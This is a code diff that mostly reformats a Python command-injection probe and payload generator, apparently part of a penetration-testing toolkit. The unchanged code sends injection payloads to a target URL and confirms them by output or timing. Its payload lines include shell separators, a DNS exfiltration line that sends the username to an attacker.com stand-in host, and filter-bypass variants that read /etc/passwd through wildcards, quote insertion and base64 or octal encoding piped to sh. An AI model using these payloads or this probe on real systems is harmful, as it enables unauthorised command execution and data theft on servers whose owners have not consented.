@@ -8,7 +8,7 @@ and generating bypass payloads for filtered environments.
 import json
 import re
 import time
-from typing import Dict, List, Optional, Tuple
+from typing import List, Optional, Tuple
 
 import requests
 
@@ -48,12 +48,21 @@ class CommandInjectionProbeTool:
 
     # Linux separators paired with detection commands
     LINUX_SEPARATORS: List[str] = [
-        ";", "|", "||", "&&", "`", "$(", "%0a", "\n",
+        ";",
+        "|",
+        "||",
+        "&&",
+        "`",
+        "$(",
+        "%0a",
+        "\n",
     ]
 
     # Windows separators
     WINDOWS_SEPARATORS: List[str] = [
-        "&", "|", "||",
+        "&",
+        "|",
+        "||",
     ]
 
     # Detection commands and their expected output patterns (Linux)
@@ -107,7 +116,9 @@ class CommandInjectionProbeTool:
                 return match.group(1)
         return None
 
-    def _build_output_payloads(self, os_target: str) -> List[Tuple[str, str, Optional[str]]]:
+    def _build_output_payloads(
+        self, os_target: str
+    ) -> List[Tuple[str, str, Optional[str]]]:
         """Build output-based payloads: (payload_string, description, expected_pattern)."""
         payloads = []
 
@@ -160,7 +171,9 @@ class CommandInjectionProbeTool:
         request_data = {param: payload, **extra_data}
         headers = headers or {}
         if method == "GET":
-            return self.session.get(url, params=request_data, headers=headers, timeout=timeout)
+            return self.session.get(
+                url, params=request_data, headers=headers, timeout=timeout
+            )
         else:
             # Detect JSON content type
             content_type = ""
@@ -169,9 +182,13 @@ class CommandInjectionProbeTool:
                     content_type = v.lower()
                     break
             if "application/json" in content_type:
-                return self.session.post(url, json=request_data, headers=headers, timeout=timeout)
+                return self.session.post(
+                    url, json=request_data, headers=headers, timeout=timeout
+                )
             else:
-                return self.session.post(url, data=request_data, headers=headers, timeout=timeout)
+                return self.session.post(
+                    url, data=request_data, headers=headers, timeout=timeout
+                )
 
     def use(self, tool_input: str) -> str:
         # Parse JSON input
@@ -181,7 +198,9 @@ class CommandInjectionProbeTool:
             return f"[CommandInjectionProbeTool] Error: tool_input must be JSON. Decoding failed with: {exc}"
 
         url = data.get("url", "").strip() if isinstance(data.get("url"), str) else ""
-        param = data.get("param", "").strip() if isinstance(data.get("param"), str) else ""
+        param = (
+            data.get("param", "").strip() if isinstance(data.get("param"), str) else ""
+        )
         method = data.get("method", "GET").upper()
         extra_data = data.get("data", {})
         headers = data.get("headers", {})
@@ -198,7 +217,9 @@ class CommandInjectionProbeTool:
             return f"[CommandInjectionProbeTool] Error: 'os_target' must be linux, windows, or both, got '{os_target}'."
 
         try:
-            return self._probe_cmdi(url, method, param, extra_data, headers, os_target, timeout)
+            return self._probe_cmdi(
+                url, method, param, extra_data, headers, os_target, timeout
+            )
         except requests.RequestException as e:
             return f"[CommandInjectionProbeTool] Request error: {e}"
         except Exception as e:
@@ -239,7 +260,9 @@ class CommandInjectionProbeTool:
             baseline_time = time.time() - baseline_start
             baseline_text = baseline.text
             baseline_len = len(baseline_text)
-            results.append(f"Baseline: status={baseline.status_code}, length={baseline_len}, time={baseline_time:.2f}s")
+            results.append(
+                f"Baseline: status={baseline.status_code}, length={baseline_len}, time={baseline_time:.2f}s"
+            )
         except Exception as e:
             return f"[CommandInjectionProbeTool] Error: Could not get baseline response: {e}"
 
@@ -311,14 +334,18 @@ class CommandInjectionProbeTool:
                 time_diff = elapsed - baseline_time
 
                 if time_diff > 4.0:
-                    time_based_results.append({
-                        "payload": payload,
-                        "desc": desc,
-                        "elapsed": elapsed,
-                        "diff": time_diff,
-                    })
+                    time_based_results.append(
+                        {
+                            "payload": payload,
+                            "desc": desc,
+                            "elapsed": elapsed,
+                            "diff": time_diff,
+                        }
+                    )
                     results.append(f"[+] TIME-BASED INJECTION: {desc}")
-                    results.append(f"    Elapsed: {elapsed:.2f}s (baseline: {baseline_time:.2f}s, diff: {time_diff:.2f}s)")
+                    results.append(
+                        f"    Elapsed: {elapsed:.2f}s (baseline: {baseline_time:.2f}s, diff: {time_diff:.2f}s)"
+                    )
                 else:
                     results.append(f"[-] No delay: {desc} ({elapsed:.2f}s)")
 
@@ -332,15 +359,21 @@ class CommandInjectionProbeTool:
         if confirmed_injections or time_based_results:
             results.append("[!] COMMAND INJECTION DETECTED!")
             if confirmed_injections:
-                results.append(f"[*] Output-based confirmed: {len(confirmed_injections)} injection(s)")
+                results.append(
+                    f"[*] Output-based confirmed: {len(confirmed_injections)} injection(s)"
+                )
                 for inj in confirmed_injections:
                     results.append(f"    - {inj}")
             if time_based_results:
-                results.append(f"[*] Time-based confirmed: {len(time_based_results)} injection(s)")
+                results.append(
+                    f"[*] Time-based confirmed: {len(time_based_results)} injection(s)"
+                )
                 for tb in time_based_results:
                     results.append(f"    - {tb['desc']} (delay: {tb['diff']:.2f}s)")
             if successful_separators:
-                results.append(f"[*] Successful separators: {', '.join(repr(s) for s in successful_separators)}")
+                results.append(
+                    f"[*] Successful separators: {', '.join(repr(s) for s in successful_separators)}"
+                )
             if detected_os:
                 results.append(f"[*] Detected OS: {detected_os}")
         else:
@@ -527,7 +560,7 @@ class CommandInjectionPayloadGenerator:
             lines.append("")
 
             lines.append("=== Windows DNS Exfiltration ===")
-            lines.append(f"& nslookup %USERNAME%.attacker.com")
+            lines.append("& nslookup %USERNAME%.attacker.com")
             lines.append("")
 
         return "\n".join(lines)
@@ -557,14 +590,14 @@ class CommandInjectionPayloadGenerator:
             part2 = command[mid:]
             lines.append(f"# Single-quote insertion: {part1}'{part2}")
             lines.append(f"{part1}'{part2}")
-            lines.append(f"# Double-quote insertion: {part1}\"{part2}")
+            lines.append(f'# Double-quote insertion: {part1}"{part2}')
             lines.append(f'{part1}"{part2}')
             lines.append(f"# Backslash insertion: {part1}\\{part2}")
             lines.append(f"{part1}\\{part2}")
         lines.append("# Wildcard match (e.g., cat -> /bin/c?t)")
         lines.append("/bin/c?t /etc/passwd")
         lines.append("/bin/ca* /etc/passwd")
-        lines.append(f"# Variable expansion: c${{not_exist}}at")
+        lines.append("# Variable expansion: c${not_exist}at")
         lines.append("c${not_exist}at /etc/passwd")
         lines.append("")
 
@@ -577,7 +610,7 @@ class CommandInjectionPayloadGenerator:
         lines.append(f"echo {command}|base64 => use result in: echo <b64>|base64 -d|sh")
         lines.append("echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh")
         lines.append("# Octal encoding")
-        lines.append(f"$'\\143\\141\\164' /etc/passwd")
+        lines.append("$'\\143\\141\\164' /etc/passwd")
         lines.append("")
 
         return "\n".join(lines)
